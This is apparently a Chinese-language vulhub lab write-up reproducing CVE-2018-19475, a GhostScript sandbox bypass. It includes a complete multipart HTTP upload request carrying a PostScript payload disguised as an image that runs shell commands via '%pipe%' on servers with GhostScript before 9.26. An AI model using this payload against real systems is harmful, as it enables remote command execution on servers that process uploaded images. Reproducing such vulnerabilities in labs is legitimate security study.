# GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）

###### by ADummy

### 0x00利用路线

​			构造poc png图片--->上传图片--->有回显命令执行

### 0x01漏洞介绍

​			2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。

### 0x02漏洞复现

将POC作为图片上传，执行命令`id > /tmp/success && cat /tmp/success`：

```
POST /index.php HTTP/1.1
Host: target
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO
Content-Length: 279

------WebKitFormBoundaryukZmnyhO
Content-Disposition: form-data; name="file_upload"; filename="1.jpg"
content-Type="image/png"

%!PS
0 1 300367 {} for
{save restore} stopped {} if
(%pipe%id > /tmp/success && cat /tmp/success) (w) file
------WebKitFormBoundaryukZmnyhO--
```

![GhostScript_沙箱绕过_RCE1_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/GhostScript_沙箱绕过_RCE2_1.jpg)



当然，真实环境下通常无法直接回显漏洞执行结果，你需要使用带外攻击的方式来检测漏洞

